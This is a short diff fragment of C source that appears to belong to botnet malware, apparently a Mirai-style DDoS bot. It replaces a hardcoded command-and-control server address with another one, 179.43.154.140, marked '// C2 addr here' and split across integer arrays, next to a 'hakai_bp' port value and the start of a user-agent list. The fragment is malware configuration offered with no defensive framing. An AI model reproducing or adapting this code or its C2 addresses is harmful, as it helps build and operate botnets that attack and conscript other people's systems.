@@ -40,10 +40,12 @@
 #include <sys/ioctl.h>
 #include <net/if.h>
 
-int hacks[] = {23};//23.254.161.87
-int hacks2[] = {254};
-int hacks3[] = {161};
-int hacks4[] = {87}; 
+// C2 addr here
+// 179.43.154.140
+int hacks[] = {179};
+int hacks2[] = {43};
+int hacks3[] = {154};
+int hacks4[] = {140}; 
 int hakai_bp = 420;
 
 const char *UserAgents[] = {
